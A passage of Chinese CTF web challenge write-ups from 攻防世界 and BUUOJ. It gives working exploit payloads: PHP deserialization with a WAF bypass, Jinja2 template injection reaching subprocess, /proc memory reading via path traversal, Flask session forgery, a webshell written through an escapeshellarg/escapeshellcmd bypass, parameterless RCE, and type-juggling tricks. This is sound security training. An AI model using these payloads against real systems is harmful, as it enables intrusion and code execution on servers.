            call_user_func_array(array($this, $this->method), $this->args);
        }
    } 
 
    function ping($ip){
        exec($ip, $result);
        var_dump($result);
    }

    function waf($str){
        if (!preg_match_all("/(\||&|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {
            return $str;
        } else {
            echo "don't hack";
        }
    }
 
    function __wakeup(){
        foreach($this->args as $k => $v) {
            $this->args[$k] = $this->waf($v);
        }
    }   
}

$ctf=@$_POST['ctf'];
@unserialize(base64_decode($ctf));
?>
```

### 前置知识

#### `in_array`

in_array — 检查数组中是否存在某个值 **严格匹配**

##### 说明

```
in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool
```

大海捞针，在大海（`haystack`）中搜索针（ `needle`），如果没有设置 `strict` 则使用宽松的比较。

##### 参数



- `needle`

  待搜索的值。**Note**:如果 `needle` 是字符串，则比较是区分大小写的。

- `haystack`

  待搜索的数组。

- `strict`

  如果第三个参数 `strict` 的值为 **`TRUE`** 则 **in_array()** 函数还会检查 `needle` 的[类型](language.types.html)是否和 `haystack` 中的相同。

##### 返回值

如果找到 `needle` 则返回 **`TRUE`**，否则返回 **`FALSE`**。

##### 示例

```php
<?php
var_dump(in_array("ping", array("ping")));
# 输出：TRUE

<?php
var_dump(in_array("ping1", array("ping")));
# 输出：FALSE
```

#### `call_user_func_array`

call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数

##### 说明

```
call_user_func_array ( [callable](language.types.callable.html) `$callback` , array `$param_arr` )
```

把第一个参数作为回调函数（`callback`）调用，把参数数组作（`param_arr`）为回调函数的的参数传入。

##### 参数

- `callback`

  被调用的回调函数。

- `param_arr`

  要被传入回调函数的数组，这个数组得是索引数组。

###### 返回值

返回回调函数的结果。如果出错的话就返回**`FALSE`**

### Linux部分

Linux 命令中插入引号依然可以继续执行想要执行的命令

```
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
└─# c''at f''lag.txt
flag is this
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
└─# c""at f""lag.txt
flag is this
```

Linux 中可以使用`printf`配合编码打印出想要打印的字符串

```
\NNN 八进制数 NNN 所代表的 ASCII 码字符。
\xHH 十六进制 HH 对应的8位字符。HH 可以是一到两位。
\uHHHH 十六进制 HHHH 对应的 Unicode 字符。HHHH 一到四位。
\UHHHHHHHH十六进制 HHHHHHHH 对应的 Unicode 字符。HHHHHHHH 一到八位
```

```
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
└─# printf "\57"
/ 
```

### 解题流程

使用双引号绕过WAF，`$(printf${IFS}"\57") = /`

**最后脚本**

```php
<?php

class ease
{

    public $method = "ping";
    public $args = array('c""at${IFS}f""lag_1s_here$(printf${IFS}"\57")f""lag_831b69012c67b35f.p""hp');

    function __destruct()
    {
        # $method 必须是字符串 ping
        if (in_array($this->method, array("ping"))) {
            call_user_func_array(array($this, $this->method), $this->args);
        }
    }

    function ping($ip)
    {
        exec($ip, $result);
        var_dump($result);
    }


}
$e = new ease();
$e = serialize($e);
echo base64_encode($e);
```

## 攻防世界 Web_python_template_injection

考点是Python jinjia2 的模板注入，一开始找了一下没发现注入点，偷瞄了一下才知道原来是直接在URL后面加

先拿到基类`object`，在查找下面的子类

```
{{''.__class__.__mro__[2].__subclasses__()}}
```

直接使用`Ctrl+f`查找，寻找可利用的模块，最后发现一个可利用的模块：`<class 'subprocess.Popen'>`，这里提供Python代码来寻找

```py
import requests

base_url = "http://61.147.171.105:57186/"
for i in range(500):
    payload = "{{''.__class__.__mro__[2].__subclasses__()[" + str(i) + "]}}"
    res = requests.get(base_url + payload).text
    # print(res)
    if "subprocess" in res:
        print("发现索引：", i, "payload：", payload)

```

最后payload

```
{{''.__class__.__mro__[2].__subclasses__()[237]('cat fl4g',shell=True,stdout=-1).communicate()[0].strip()}}
```

![image-20230902220848461](CTF.assets/image-20230902220848461.png)

## 攻防世界 web2

### 1. 前置知识

ROT13编码：ROT13编码其实就是凯撒密码，偏移量为13；php函数为：`str_rot13()`，编码和解码都是用这个函数！

### 2. 题目源码

```bash
<?php
$miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";

function encode($str){
    $_o=strrev($str);
    // echo $_o;
        
    for($_0=0;$_0<strlen($_o);$_0++){
       
        $_c=substr($_o,$_0,1);
        $__=ord($_c)+1;
        $_c=chr($__);
        $_=$_.$_c;   
    } 
    return str_rot13(strrev(base64_encode($_)));
}

highlight_file(__FILE__);
/*
   逆向加密算法，解密$miwen就是flag
*/
?>
```

### 3. 解题分析

加密过程：

1. 字符串翻转
2. 从字符串中将字符串从左到右一个个取出
3. 将字符转为ASCII码后加1
4. 将ASCII码转为字符
5. 拼接字符串
5. base64 编码字符串
6. 将 base64 编码翻转
7. 将 base64 编码做 ROT13 编码
7. 得到密文

解密脚本：

```php
<?php
$miwen = "a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";

# 密文 ROT13 编码
$a = str_rot13($miwen);
var_dump($a);
# 密文翻转
$b = strrev($a);
var_dump($b);
# 密文解码
$c = base64_decode($b);
var_dump($c);

# 将得到的结果的每个字符逐一取出，转为ASCII码后减1再拼接，再转回字符
function decode($str)
{
    for ($i = 0; $i < strlen($str); $i++) {
        $simple = substr($str, $i, 1);
        $simple = ord($simple) - 1;
        $simple = chr($simple);
        $res = $res.$simple;
    }
    return $res;
}

$d = decode($c);
# 最后再做一次翻转
var_dump(strrev($d));		# 输出：flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}
```

## 攻防世界 catcat-new

> 这题主要考察的是文件包含漏洞和内存读取，有看不懂的就去看葵花宝典“Linux 虚拟文件系统”

### 1. 任意文件读取

进去随便点一下可以看到有一个`$_GET`变量`file`，输入错误文件名可以看到它的报错信息和包含路径

<img src="CTF.assets/image-20231118162602292.png" alt="image-20231118162602292" style="zoom:67%;" />

使用相对路径做包含访问`/etc/passwd`文件成功

<img src="CTF.assets/image-20231118162641355.png" alt="image-20231118162641355" style="zoom: 50%;" />

然后就没有头绪了，在这里卡了好久！

尝试包含`/proc`文件，把能看的都看一下，最后得到如下信息：

```
file=../../../../../proc/self/cmdline：	
python app.py			

file=../../../../../proc/self/environ：	得到下面信息
HOSTNAME=b90b9e98836f 
PYTHON_PIP_VERSION=21.2.4 
SHLVL=1 
HOME=/root 
OLDPWD=/ GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D 
PYTHON_GET_PIP_URL=https://github.com/pypa/getpip/raw/3cb8888cc2869620f57d5d2da64da38f516078c7/public/get-pip.py 
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin 
LANG=C.UTF-8 
PYTHON_VERSION=3.7.12 
PYTHON_SETUPTOOLS_VERSION=57.5.0 
PWD=/app 
PYTHON_GET_PIP_SHA256=c518250e91a70d7b20cceb15272209a4ded2a0c263ae5776f129e0d9b5674309
```

**信息汇总：**

1. 当前文件名：`app.py`
2. 当前工作路径：`/app`

知道了路径和文件名，就可以直接包含出源文件了

<img src="CTF.assets/image-20231118163417266.png" alt="image-20231118163417266" style="zoom:50%;" />

由于这里使用的时二进制传输，在python中使用一下方式做格式转换

```python
src = b'import os \nimport uuid...'
print(sec.decode())
```

就可以得到源码

### 2. 代码审计

通过上面的方式分别拿到`app.py`和`cat.py`

**app.py**

+ python脚本先读取了flag，然后再删除了flag；所以flag保存在了**内存**里面
+ 在`/info`位置可以做文件包含包含内存文件来读取：`flag`和`SECRET_KEY`
+ 在拿到了`SECRET_KEY`之后可以做 Session 伪造，让系统返回Flag

```py
import os
import uuid
from flask import Flask, request, session, render_template, Markup
from cat import cat

flag = ""
app = Flask(
    __name__,
    static_url_path='/',
    static_folder='static'
)
# 设置 SECRET_KEY
app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "") + "*abcdefgh"
# 读取 /flag 文件到内存，然后删除该文件
if os.path.isfile("/flag"):
    flag = cat("/flag")
    os.remove("/flag")


@app.route('/', methods=['GET'])
def index():
    detailtxt = os.listdir('./details/')
    cats_list = []
    for i in detailtxt:
        cats_list.append(i[:i.index('.')])

    return render_template("index.html", cats_list=cats_list, cat=cat)

# 文件包含代码位置：该位置接受两个参数：start，end；默认都为0
@app.route('/info', methods=["GET", 'POST'])
def info():
    filename = "./details/" + request.args.get('file', "")
    start = request.args.get('start', "0")
    end = request.args.get('end', "0")
    name = request.args.get('file', "")[:request.args.get('file', "").index('.')]

    return render_template("detail.html", catname=name, info=cat(filename, start, end))


# 如果身份是admin，则返回Flag
@app.route('/admin', methods=["GET"])
def admin_can_list_root():
    if session.get('admin') == 1:
        return flag
    else:
        session['admin'] = 0
    return "NoNoNo"


if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=False, port=5637)

```

**cat.py**

这是一个文件读取的脚本，可以给定起始位：`start`，结束位：`end`来决定文件读取的长度

```py
import os, sys, getopt


def cat(filename, start=0, end=0) -> bytes:
    data = b''

    try:
        start = int(start)
        end = int(end)
    except:
        start = 0
        end = 0

    if filename != "" and os.access(filename, os.R_OK):
        f = open(filename, "rb")

        if start >= 0:
            f.seek(start)
            if end >= start and end != 0:
                data = f.read(end - start)

            else:
                data = f.read()

        else:
            data = f.read()
            f.close()

    else:
        data = ("File `%s` not exist or can not be read" % filename).encode()

    return data


if __name__ == '__main__':
    opts, args = getopt.getopt(sys.argv[1:], '-h-f:-s:-e:', ['help', 'file=', 'start=', 'end='])
    fileName = "../end.txt"
    start = 0
    end = 0

    for opt_name, opt_value in opts:
        if opt_name == '-h' or opt_name == '--help':
            print("[*] Help")
            print("-f --file File name")
            print("-s --start Start position")
            print("-e --end End position")
            print("[*] Example of reading /etc/passwd")
            print("python3 cat.py -f /etc/passwd")
            print("python3 cat.py --file /etc/passwd")
            print("python3 cat.py -f /etc/passwd -s 1")
            print("python3 cat.py -f /etc/passwd -e 5")
            print("python3 cat.py -f /etc/passwd -s 1 -e 5")
            exit()

        elif opt_name == '-f' or opt_name == '--file':
            fileName = opt_value

        elif opt_name == '-s' or opt_name == '--start':
            start = opt_value

        elif opt_name == '-e' or opt_name == '--end':
            end = opt_value

    if fileName != "":
        print(cat(fileName, start, end))

    else:
        print("No file to read")
```

**cat.py 本地尝试**

```py
import os, sys, getopt


def cat(filename, start=0, end=0) -> bytes:
    data = b''

    try:
        start = int(start)
        end = int(end)
    except:
        start = 0
        end = 0

    if filename != "" and os.access(filename, os.R_OK):
        f = open(filename, "rb")
		# 如果给定起始位，那么将文件光标定位到起始位
        if start >= 0:
            f.seek(start)
            if end >= start and end != 0:
                # 从起始位开始读取长度：长度=结束位-起始位
                data = f.read(end - start)

            else:
                data = f.read()

        else:
            data = f.read()
            f.close()

    else:
        data = ("File `%s` not exist or can not be read" % filename).encode()

    return data


if __name__ == '__main__':
    opts, args = getopt.getopt(sys.argv[1:], '-h-f:-s:-e:', ['help', 'file=', 'start=', 'end='])
    # 给定文件名
    fileName = "../end.txt"
    # 给定起始位
    start = 0
    # 给定结束位
    end = 50

    if fileName != "":
        print(cat(fileName, start, end))

    else:
        print("No file to read")

```

### 3. 解题复现

**抓取内存信息脚本**

在这一步做到了抓取SECRET_KEY，但是无法复现Session伪造！（不知道什么原因）

直接抓Flag的话也抓的到：`catctf{Catch_the_c4t_HaHa}`

最好将关键信息保存到txt文件再做分析，控制台总感觉好像显示不全

```py
import requests
from lxml import etree
import re


# 1. 先读取maps文件
req = requests.get('http://61.147.171.105:60619/info?file=../../../../../proc/self/maps').content

# 2. 将maps文件写入本地：maps.txt
html = etree.HTML(req.decode())
list1 = html.xpath('//div[@class="feature-block"]/p/text()')
# print(list1[0])

# 3. 将得到的结果做格式处理并写入 maps.txt
maps_data = re.search("b'(.*?)'", list1[0])
maps_data = maps_data.group(1)
maps_data = maps_data.replace("\\n", "\n")

with open('maps.txt', 'w') as f:
    f.write(maps_data)

count = 1
# 抓取有权限访问的内存地址：rw-p,并访问
with open('maps.txt', 'r') as maps:
    # maps 是一个可迭代对象，而for循环会自动从这个迭代对象中获取下一行
    for line in maps:
        if 'rw-p' in line:
            start = re.search('([0-9a-z]{12})-', line)
            end = re.search('-([0-9a-z]{12})', line)

            # 格式处理
            start = int(str(start.group(1)), 16)
            end = int(str(end.group(1)), 16)

            # 拿到了起始位和结束位，发送请求！
            url = f"http://61.147.171.105:60619/info?file=../../../../../proc/self/mem&start={start}&end={end}"
            mem_data = requests.get(url).content
            print(f"正在发送{count}次请求")
            count += 1

            # 匹配 SECRET_KEY
            # if re.search(b'[a-z0-9]{32}\*abcdefgh', mem_data):
            #     print(mem_data)

            if re.search(b'catctf', mem_data):
                print(mem_data)
                with open('end.txt', 'wb') as f:
                    f.write(mem_data)
```

## BUUOJ [HCTF 2018]admin

### 1. 分析

这题主要考的也是Flask session伪造，进入站点注册账号，在`/index`可以看到提示

![image-20231118222810726](CTF.assets/image-20231118222810726.png)

在`/change`也有一个提示

<img src="CTF.assets/image-20231118222846383.png" alt="image-20231118222846383" style="zoom:50%;" />

他这里的GitHub网址已经访问不了了，因为这里包含着这个网站的源码，如果访问不了就没法做，只能看人家的WP了

在`config.py`里面带有`SECRET_KEY`

![在这里插入图片描述](CTF.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY0MjYxMA==,size_16,color_FFFFFF,t_70.png)

在`index.html`里面有着返回flag的条件

![在这里插入图片描述](CTF.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY0MjYxMA==,size_16,color_FFFFFF,t_70-17003178622923.png)

### 2. 复现

知道了`SECRET_KEY`就可以伪造Session了，将原来的cookie做解密得到：

`{'_fresh': True, '_id': b'7be77543f7fdd4412dc2bc1d9ae48d46b5af748eaf447a41d456c58a0281e6162f406b1b8a3f4fc528d327229117a39f2c331718c6e06229090558c5a8eabf27', 'csrf_token': b'512005a06dc2271f47a99391e9cc02e759062f10', 'image': b'j01X', 'name': 'test', 'user_id': '10'}`

![image-20231118223221319](CTF.assets/image-20231118223221319.png)

在`index.html`中可以看到，只要session中的`name`值为`admin`就返回flag！所以把用户改为`admin`即可

```bash
┌──(kali㉿kali)-[~/ctfTool/web/flask-session-cookie-manager]
└─$ python flask_session_cookie_manager3.py encode -s 'ckj123' -t "{'_fresh': True, '_id': b'7be77543f7fdd4412dc2bc1d9ae48d46b5af748eaf447a41d456c58a0281e6162f406b1b8a3f4fc528d327229117a39f2c331718c6e06229090558c5a8eabf27', 'csrf_token': b'512005a06dc2271f47a99391e9cc02e759062f10', 'image': b'j01X', 'name': 'admin', 'user_id': '10'}" 
.eJxFkEGLwjAQhf_KMmcPtq4XwUMgVrYwU7qklORSurXaJo0LVTGN-N83lWX3NPDem48384DqOLaXDjbX8dYuoOoPsHnA2xdsgOJ0IN9ExMlSrIzi-RJFaqRPe-kTk5XJQLwzxFVPZWLJ5-9qnjxfSZG7kI_IYpTtd3fUJ6eEdKTT4LNY6qQPulf600pfTNk-96ibCbVxKA4d-sGiRY9-t0LRabLFnfTHlAm2Rl4EJkZSdIMsUxv2tvBcQHMZj9X127Tn_xPEbkLOQpTFao8B3zil53pmjd6ESoOWnk1KNFFAx2ilQ7Z94Xpbn9o_Uq2ZK3-dc23bWTrY_gwLuF3a8fU3iJbw_AFHom6X.ZVjHzw.mSXkO4n622QtjDNolUC2WE7gVm4
```

最后重放一下：`flag{ac18cd89-3e59-4fa2-8c2c-37ce873b8a0d}`

![image-20231118223436538](CTF.assets/image-20231118223436538.png)

## BUUOJ [网鼎杯 2020 朱雀组]phpweb

> 这题也不难，就是脑袋没转过来，很多东西没想到

进去看到一个报错，然后就没了，抓包看看（不要难得抓包，求求了），很清楚的看到：`func`为函数名，`p`为参数，后面一定也有一个回调函数

![image-20231118235333178](CTF.assets/image-20231118235333178.png)

这里一开始是想用`system eval`之类的函数直接执行的，结果又被过滤了，然后想再用一个回调函数来调用`system`函数，但是可恶只有一个传参`p`可以传入

使用`highlight_file`函数把源码读取出

把思路打开，有一个`Test`类，也可以调用函数，那么就可以利用这个`Test`类来做反序列化

```php
<!DOCTYPE html>
<html>
<head>
    <title>phpweb</title>
    <style type="text/css">
        body {
            background: url("bg.jpg") no-repeat;
            background-size: 100%;
        }
        p {
            color: white;
        }
    </style>
</head>

<body>
<script language=javascript>
    setTimeout("document.form1.submit()",5000)
</script>
<p>
    <?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }


    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

	# 只要 func 不为空且不再黑名单内就能执行。
    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
</p>
<form  id=form1 name=form1 action="index.php" method=post>
    <input type=hidden id=func name=func value='date'>
    <input type=hidden id=p name=p value='Y-m-d h:i:s a'>
</body>
</html>
```

**反序列化脚本**

```php
<?php

class Test
{
    var $p = "ls /";
    var $func = "system";

    function __destruct()
    {
        if ($this->func != "") {
            echo gettime($this->func, $this->p);
        }
    }
}



$t = new Test();
echo serialize($t);
```

最后flag在`/tmp/flagoefiu4r93`：`flag{9ebf9a02-7328-470d-9609-8d42f97ec7da}`

payload：`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat+/tmp/flagoefiu4r93";s:4:"func";s:6:"system";}`

## BUUOJ [BUUCTF 2018]Online Tool

### 1. 前置知识

#### 1.1 escapeshellarg 与 escapeshellcmd 原理

+ escapeshellarg：先将 字符串 用引号包裹，期间如果遇到 单引号，会用 \ 转义再用单引号包裹，即：`'\''`
+ escapeshellcmd：反斜线（\）会在以下字符之前插入：&#;`|*?~<>^()[]{}$\、\x0A 和 \xFF。 **' 和 " 仅在不配对儿的时候被转义**

示例：

```bash
<?php
$_GET['host'] = "127.0.0.1'";

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    echo $host."\n";						# 输出：'127.0.0.1'\'''
    $host = escapeshellcmd($host);
    echo $host."\n";						# 输出：'127.0.0.1'\\''\'
}
```

如果是先使用`escapeshellarg`再使用`escapeshellcmd`函数的时候，两个函数相互叠加，相互转义，就有可能被绕过

### 2. 复现

```
payload：' <?php @eval($_POST["cmd"]);?> -oG yjh.php '
```

这条payload经过转义之后，会外把外面两个单引号闭合`'`

```php
<?php
$_GET['host'] = "' 1 '";

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    echo $host."\n";					# 输出：''\'' 1 '\'''
    $host = escapeshellcmd($host);
    echo $host."\n";					# 输出：''\\'' 1 '\\'''，单引号干好成对出现闭合
}
```

对于中间部分，也会刚好有一个`\`做转义，使得一句话木马写入成功

```bash
<?php
$_GET['host'] = ' <?php @eval($_POST["cmd"]);?> -oG yjh.php ';

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);			
    echo $host."\n";							# 输出：'<?php @eval($_POST["cmd"]);?> -oG yjh.php'
    $host = escapeshellcmd($host);
    echo $host."\n";					# 输出：'\<\?php @eval\(\$_POST\[\"cmd\"\]\)\;\?\> -oG yjh.php'
}
```

最后使用蚁剑连接即可！

## BUUOJ [GXYCTF2019]禁止套娃

### 1. 复现

进来没有什么头绪，看HTTP报文也没有什么东西。此时只能做一个目录爆破

<img src="CTF.assets/image-20231120231000621.png" alt="image-20231120231000621" style="zoom: 67%;" />

![image-20231120231112409](CTF.assets/image-20231120231112409.png)

发现有一个`.git`文件夹，直接用`githacker`导出来，发现源码！

```bash
┌──(root㉿kali)-[/home/kali/ctfTool/web/GitHack]
└─# python GitHack.py http://3309502c-0f7b-42e5-bfbb-3136abbc9efe.node4.buuoj.cn:81/.git/
[+] Download and parse index file ...
[+] index.php
[OK] index.php
```

整个源码主要要注意的位置是第二条正则过滤，只要绕过这条其他的都好说！

```php
<?php
$_GET['exp'] = 'session_start();';
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                 echo $_GET['exp'];
//                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);

```

第二条正则是CTF无参数RCE考点的主要写法，还有一种写法是：`/[^\W]+\((?R)?\)/`

```
/[a-z,_]+\((?R)?\)/

[a-z,_]+：匹配多个小写字母
\(：匹配 (
\)：匹配 )
?R：递归匹配。能匹配 a(b(c()))
总结：匹配所有不带参数的函数
```

翻翻葵花宝典，原来学过！再初略复习了一下之后写出了第一条payload：

```
payload1：show_source(array_rand(array_flip(scandir(current(localeconv())))));		# 随机
payload2：show_source(next(array_reverse(scandir(current(localeconv())))));
```

这里稍微解释一下：

```php
<?php
var_dump(localeconv());

# 输出：
array(18) {
  'decimal_point' =>
  string(1) "."						# 主要是这里，能拿到一个“.”，基于这个点就可以扫描当前目录
  'thousands_sep' =>
  string(0) ""
  'int_curr_symbol' =>
  string(0) ""
  'currency_symbol' =>
  string(0) ""
  'mon_decimal_point' =>
  string(0) ""
  'mon_thousands_sep' =>
  string(0) ""
  'positive_sign' =>
  string(0) ""
  'negative_sign' =>
  string(0) ""
  'int_frac_digits' =>
  int(127)
  'frac_digits' =>
  int(127)
  'p_cs_precedes' =>
  int(127)
  'p_sep_by_space' =>
  int(127)
  'n_cs_precedes' =>
  int(127)
  'n_sep_by_space' =>
  int(127)
  'p_sign_posn' =>
  int(127)
  'n_sign_posn' =>
  int(127)
  'grouping' =>
  array(0) {
  }
  'mon_grouping' =>
  array(0) {
  }
}
```

![img](CTF.assets/2541080-20211014131709032-1238913099.png)

## BUUOJ [BJDCTF2020]Mark loves cat

### 1. 复现

#### 1.1 信息搜集

`dirsearch`扫描发现`git`文件泄露，下面这种参数写法，将线程改为1，超时时间该为2秒，并屏蔽`400,403,404,500,503,429`状态码可有效绕过BUUOJ 状态码 429 的问题

```php
┌──(root㉿kali)-[/home/kali/ctfTool/web/Git_Extract]
└─# dirsearch -u http://916818cf-4af8-4998-904e-ba3ac6275bac.node4.buuoj.cn:81/ -t 1 --timeout=2 -x 400,403,404,500,503,429

[09:29:26] 301 -  169B  - /.git  ->  http://916818cf-4af8-4998-904e-ba3ac6275bac.node4.buuoj.cn/.git/
[09:29:26] 200 -    5B  - /.git/COMMIT_EDITMSG                              
[09:29:26] 200 -  137B  - /.git/config
[09:29:26] 200 -   73B  - /.git/description
[09:29:26] 200 -   23B  - /.git/HEAD                                        
[09:29:27] 200 -    6KB - /.git/index                                       
[09:31:37] 301 -  169B  - /assets  ->  http://916818cf-4af8-4998-904e-ba3ac6275bac.node4.buuoj.cn/assets/
[09:32:52] 200 -    0B  - /flag.php  
```

使用`Githack`获取文件

```bash
┌──(root㉿kali)-[/home/kali/ctfTool/web/GitHack]
└─# python GitHack.py http://02595af5-036a-4cbd-88be-46238bd5d779.node4.buuoj.cn:81/.git/

```

成功拿到源码文件，这里我前面几次跑都没有拿到源码；所以如果这里拿不到源码的话就多试几次

![image-20231124012506345](CTF.assets/image-20231124012506345.png)

**源码 index.php**

```php
<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){         
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}



echo "the flag is: ".$flag;
var_dump($flag);
```

**源码 flag.php**

```php
<?php
$flag = file_get_contents('/flag');  
```

### 1.2 解法一

注意这块代码，目标是让：`$handsome=$flag`。这样就可以将`flag`取出

1. 令：`$x = 'handsome'`
2. 得：`$$x = $handsome`
3. 令：`$y = 'flag'`
4. 得：`$$y = $flag`
5. 因：` $$x = $$y`
6. 所以：`$handsome=$flag`
7. 最后payload：`?handsome=flag&flag=handsome`；GET传参！

```php
foreach($_GET as $x => $y){         
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}
```

### 1.3 解法二

注意这块代码，目标是让：`$yds=$flag`

1. 令：`$x = 'yds'`
2. 得：`$$x = $yds`
3. 令：`$y ='flag'`
4. 得：`$$y = $flag`
5. 因：`$$x = $$y`
6. 所以：`$yds = $flag`
7. 最后payload：`?yds=flag`；GET传参！

```php
foreach($_GET as $x => $y){       
    $$x = $$y;
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}
```

### 1.4 解法三

注意这块代码，目标是让：`$is=$flag`

1. 令：`$x = 'is' `
2. 得：`$$x = $is`
3. 令：`$y = 'flag'`
4. 得：`$$y = $flag`
5. 因：`$$x = $$y`
6. 所以：`$is = $flag`
7. 最后payload：`?is=flag&flag=flag`；最后的`flag=flag`仅仅为了满足第五行的if判断；GET传参

```php
foreach($_GET as $x => $y){       
    $$x = $$y;
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}
```

## BUUOJ [WUSTCTF2020]朴实无华

### 1. 整形`==`比较

**常见考点1：**

这里会要求输入的`$_GET['num']`要大于`20000`但长度又要小于4，此时就可以用科学计数法绕过：`$num = '2e5';`

```php
<?php
$num = $_GET['num'];
if ($num > 20000 && strlen($num) < 4){
    echo "You are right";
}
```

**常见考点2：**

这里要求`$num`要小于2020但加一又要大于2021

```php
<?php
$num = $_GET['num'];
if (intval($num) < 2020 && intval($num + 1) > 2021) {
    echo "You are right";
}
```

在低版本的PHP中，如果`intval()`函数转换`2e5`，那么他只会取得字符串`e`前面的数字，即：`2`；此时即可满足第一个布尔比较

在所有的PHP版本中，如果`2e5 + 1`，那么会将`2e5`做科学计算即：`200000`再加一等于：`200001`，此时也可满足第二个布尔比较

所以对于这里的答案是：`$num=2e5`

*PHP 5运算结果*

```php
<?php
var_dump(intval('2e4'));
var_dump(intval('2e4'+1));

# 输出：
int(2)
int(20001)
```

### 2. md5 绕过

#### 2.1 md5==绕过(0e比较)

对于一串如：`0e830400451993494058024219903391`以`数字+字符`构成的字符串做布尔比较，PHP只会比较字符之前即`e`之前的数字

```php
<?php
var_dump('0e830400451993494058024219903391' == '0e462097431906509019562988736854');

# 输出：
bool(true)
```

*题目*

```php
<?php
$flag = 'ook!';
$a = $_GET['a'];
if ($a != 'QNKCDZO' && md5($a) == md5('QNKCDZO')) {
    echo $flag;
}else{
echo('你的答案不对0.0');
}
```

上面这段代码中就是上述0e开头的所有字串都被认为是0，所以我们先看看`md5('QNKCDZO')`的结果是`0e830400451993494058024219903391`，那么所有0e开头的md5串都可以满足上面的条件。
 常用的有：

```
QNKCDZO
0e830400451993494058024219903391
240610708
0e462097431906509019562988736854
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904	
0e215962017							# 注意这串，可造成 '0e215962017' == md5('0e215962017') --> bool(true)
0e291242476940776845150308577824
```

#### 2.2 md5===绕过(数组比较)

在php中的hash函数md5、sha1等处理中若传入一个数组的值，则会报错返回`NULL`，而返回的值在类型和内容上都是相同的，所以可以用来绕过某些两边参数可控的场景，上面只能控制一边的值传入，所以数组类型不适用。

```php
<?php
$flag = "ook!";
$a = $_GET['a'];
$b = $_GET['b'];
if ($a != $b && md5($a) === md5($b)) //这里==也可以使用数组绕过。
    echo $flag;
?>
```

上述的例子中传入`?a[]=a&b[]=b`即可满足既不相等，md5后又相等的条件,虽然报错，但仍然输出了正确的值。

#### md5===绕过(硬碰撞)

前面我们也提到了md5无论是32位还是16位，都不可能不重复的表示所有信息，这种重复的例子就称为 **硬碰撞** ，有如下代码：

```php
<?php
$s1 = $_GET['a'];
$s2 = $_GET['b'];
$s3 = $_GET['c'];
echo md5($s1),"<br/>";
echo md5($s2),"<br/>";
echo md5($s3),"<br/>";
?>
```

当传入的值为

```bash
